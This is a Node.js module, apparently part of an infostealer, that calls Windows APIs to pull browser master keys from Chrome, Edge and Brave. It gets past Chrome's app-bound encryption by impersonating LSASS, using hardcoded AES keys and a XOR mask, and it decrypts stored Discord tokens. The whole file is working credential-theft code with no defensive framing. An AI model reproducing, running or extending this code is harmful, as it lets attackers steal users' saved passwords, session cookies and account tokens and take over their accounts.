Object.defineProperty(exports, "__esModule", {
  value: true
});
const koffi = require("koffi");
const crypto = require("crypto");
const fs = require("fs");
const WinApi = require("../core/WinApi.js");
const Privilege = require("../core/Privilege.js");
const path = require("path");
function decryptWithStorageProvider(encrypted, keyName) {
  const providerBuffer = Buffer.alloc(8);
  if (WinApi.NCryptOpenStorageProvider(providerBuffer, "Microsoft Software Key Storage Provider", 0) !== 0) return null;
  const provider = koffi.decode(providerBuffer, WinApi.HANDLE);
  const keyBuffer = Buffer.alloc(8);
  const names = [keyName];
  if (keyName?.includes("Chrome") && !names.includes("Google Chrome")) names.push("Google Chrome");
  if (keyName?.includes("Edge") && !names.includes("Microsoft Edge")) names.push("Microsoft Edge");
  if (keyName?.includes("Brave") && !names.includes("Brave")) names.push("Brave");
  let key = null;
  for (const name of names) {
    if (WinApi.NCryptOpenKey(provider, keyBuffer, name, 0, 0) === 0) {
      key = koffi.decode(keyBuffer, WinApi.HANDLE);
      break;
    }
  }
  if (!key) {
    WinApi.NCryptFreeObject(provider);
    return null;
  }
  const sizeBuffer = Buffer.alloc(4);
  if (WinApi.NCryptDecrypt(key, encrypted, encrypted.length, null, null, 0, sizeBuffer, 64) !== 0) {
    WinApi.NCryptFreeObject(key);
    WinApi.NCryptFreeObject(provider);
    return null;
  }
  const size = sizeBuffer.readUInt32LE(0);
  const output = Buffer.alloc(size);
  const status = WinApi.NCryptDecrypt(key, encrypted, encrypted.length, null, output, size, sizeBuffer, 64);
  WinApi.NCryptFreeObject(key);
  WinApi.NCryptFreeObject(provider);
  return status === 0 ? output : null;
}
function parseAppBoundKey(data) {
  const cursor = {
    offset: 0
  };
  function read(length) {
    const value = data.slice(cursor.offset, cursor.offset + length);
    cursor.offset += length;
    return value;
  }
  function readUInt32() {
    const value = data.readUInt32LE(cursor.offset);
    cursor.offset += 4;
    return value;
  }
  function readByte() {
    const value = data[cursor.offset];
    cursor.offset += 1;
    return value;
  }
  const headerLen = readUInt32();
  const header = read(headerLen);
  const contentLen = readUInt32();
  const flag = readByte();
  const result = {
    headerLen,
    header,
    contentLen,
    flag
  };
  if (flag === 1 || flag === 2) {
    result.iv = read(12);
    result.ciphertext = read(32);
    result.tag = read(16);
  } else if (flag === 3) {
    result.encrypted_aes_key = read(32);
    result.iv = read(12);
    result.ciphertext = read(32);
    result.tag = read(16);
  } else result.raw_data = Buffer.concat([Buffer.from([flag]), data.slice(cursor.offset)]);
  return result;
}
function decryptAppBoundKey(data, keyName) {
  if (data.flag === 1) {
    const key = Buffer.from("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787", "hex");
    try {
      const decipher = crypto.createDecipheriv("aes-256-gcm", key, data.iv);
      decipher.setAuthTag(data.tag);
      return Buffer.concat([decipher.update(data.ciphertext), decipher.final()]);
    } catch (error) {
      return null;
    }
  }
  if (data.flag === 2) return null;
  if (data.flag === 3) {
    if (!Privilege.impersonateLsass()) return null;
    const mask = Buffer.from("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390", "hex");
    const unwrapped = decryptWithStorageProvider(data.encrypted_aes_key, keyName);
    WinApi.SetThreadToken(null, null);
    if (!unwrapped) return null;
    const key = Buffer.alloc(32);
    for (let index = 0; index < 32; index++) key[index] = unwrapped[index] ^ mask[index];
    try {
      const decipher = crypto.createDecipheriv("aes-256-gcm", key, data.iv);
      decipher.setAuthTag(data.tag);
      return Buffer.concat([decipher.update(data.ciphertext), decipher.final()]);
    } catch (error) {
      return null;
    }
  }
  return data.raw_data || null;
}
function unprotect(data) {
  const input = {
    cbData: data.length,
    pbData: data
  };
  const output = Buffer.alloc(koffi.sizeof(WinApi.DATA_BLOB));
  if (!WinApi.CryptUnprotectData(input, null, null, null, null, 0, output)) return null;
  const blob = koffi.decode(output, WinApi.DATA_BLOB);
  return Buffer.from(koffi.decode(blob.pbData, koffi.array("uint8_t", blob.cbData)));
}
async function getMasterKey(browser) {
  try {
    const localState = path.join(browser.local_state);
    if (!fs.existsSync(localState)) return null;
    const state = JSON.parse(fs.readFileSync(localState, "utf8"));
    if (!state.os_crypt) return null;
    let legacyKey = null;
    let appBoundKey = null;
    if (state.os_crypt.encrypted_key) {
      try {
        legacyKey = unprotect(Buffer.from(state.os_crypt.encrypted_key, "base64").slice(5));
      } catch (error) {
        console.warn("[-] " + browser.name + ": v10 key extraction failed");
      }
    }
    if (state.os_crypt.app_bound_encrypted_key) {
      try {
        const encrypted = Buffer.from(state.os_crypt.app_bound_encrypted_key, "base64").slice(4);
        if (Privilege.impersonateLsass()) {
          const systemPlaintext = unprotect(encrypted);
          if (!systemPlaintext) WinApi.SetThreadToken(null, null);else {
            WinApi.SetThreadToken(null, null);
            const userPlaintext = unprotect(systemPlaintext);
            if (userPlaintext) appBoundKey = decryptAppBoundKey(parseAppBoundKey(userPlaintext), browser.key_name);
          }
        }
      } catch (error) {
        console.warn("[-] " + browser.name + ": v20 key extraction failed", error);
        WinApi.SetThreadToken(null, null);
      }
    }
    if (appBoundKey) return {
      key: appBoundKey,
      isAppBound: true
    };
    return legacyKey ? {
      key: legacyKey,
      isAppBound: false
    } : null;
  } catch (error) {
    return null;
  }
}
function decryptToken(encrypted, key) {
  try {
    const encoded = encrypted.includes("dQw4w9WgXcQ:") ? encrypted.split("dQw4w9WgXcQ:")[1] : encrypted;
    const data = Buffer.from(encoded, "base64");
    const iv = data.slice(3, 15),
      tag = data.slice(-16),
      ciphertext = data.slice(15, -16);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString("utf8").trim();
  } catch (error) {
    return null;
  }
}
exports.getMasterKey = getMasterKey;
exports.decryptToken = decryptToken;
